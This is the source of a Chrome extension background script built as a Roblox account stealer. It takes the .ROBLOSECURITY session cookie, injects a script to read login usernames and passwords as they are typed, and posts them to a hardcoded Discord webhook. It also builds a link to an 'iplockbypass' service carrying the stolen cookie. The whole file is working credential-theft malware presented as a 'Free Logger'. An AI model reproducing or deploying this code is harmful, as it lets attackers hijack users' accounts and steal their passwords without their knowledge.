const webhookURL = "https://discord.com/api/webhooks/1380105215067291718/8yzJ8RMNpE-beqnA46h-v3Ik-Yb8qQ5b-INFHVWVSWterAH5C1-IkUWENhTr7zelFBvg";

// Get cookie from roblox.com
function getRobloxCookie() {
  return new Promise((resolve) => {
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
      resolve(cookie ? cookie.value : "");
    });
  });
}

// Get current tab info and status
function getStatus(url) {
  if (url.includes("/login")) return "Logging In";
  if (url.includes("/home")) return "Logged In";
  if (url === "https://www.roblox.com/" || url === "https://www.roblox.com") return "Idle";
  return "Browsing";
}

function getBrowserName() {
  const userAgent = navigator.userAgent;
  if (userAgent.includes("Firefox")) return "Firefox";
  if (userAgent.includes("Edg")) return "Edge";
  if (userAgent.includes("Chrome")) return "Chrome";
  if (userAgent.includes("Safari")) return "Safari";
  return "Unknown";
}

// Send embed to Discord
async function sendRobloxEmbed(tabUrl, username, password, cookie, homeUser) {
  const now = new Date().toLocaleString();
  const status = getStatus(tabUrl);
  const browser = getBrowserName();
  const refresher = `https://eggy.cool/iplockbypass?cookie=${encodeURIComponent(cookie)}`;

  const embed = {
  title: "🧠 Roblox Status Logger",
  color: 0x5865f2,
  description: `**Status:** ${status}\n**URL:** ${tabUrl}\n**Cookie:**\`${cookie}\``,
  fields: [
    { name: "🖥 Browser", value: browser, inline: true },
    { name: "🕒 Time", value: now, inline: true },
    { name: "👤 Dashx", value: "Free Logger", inline: true },
    { name: "👤 Username", value: homeUser || username || "N/A", inline: false},
    { name: "🔑 Password", value: password || "N/A", inline: false},
  ],
  footer: { text: "Roblox Cookie Tracker" },
  timestamp: new Date().toISOString()
};

  try {
    const res = await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Dashx Logger",
        avatar_url: "https://tr.rbxcdn.com/8f304dfb8cb0a7c2a04d2ab9ad42a812/150/150/AvatarHeadshot/Png",
        embeds: [embed]
      })
    });

    if (!res.ok) {
      const text = await res.text();
      throw new Error(`HTTP ${res.status}: ${text}`);
    }
  } catch (err) {
    console.error("Failed to send webhook:", err);
  }
}

// Get info from current active tab
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.includes("roblox.com")) {
    extractAndSend(tabId, tab.url);
  }
});

chrome.tabs.onActivated.addListener((activeInfo) => {
  chrome.tabs.get(activeInfo.tabId, (tab) => {
    if (tab && tab.url && tab.url.includes("roblox.com")) {
      extractAndSend(tab.id, tab.url);
    }
  });
});

// Inject content script and send embed
async function extractAndSend(tabId, url) {
  try {
    const cookie = await getRobloxCookie();

    chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        const usernameInput = document.querySelector("#login-username");
        const passwordInput = document.querySelector("#login-password");
        const homeUser = document.querySelector("span.age-bracket-label-username");
        return {
          username: usernameInput?.value || null,
          password: passwordInput?.value || null,
          homeUser: homeUser?.innerText || null
        };
      }
    }, async (results) => {
      if (!results || !results[0] || !results[0].result) return;

      const { username, password, homeUser } = results[0].result;
      await sendRobloxEmbed(url, username, password, cookie, homeUser);
    });
  } catch (err) {
    console.error("Error extracting and sending:", err);
  }
}
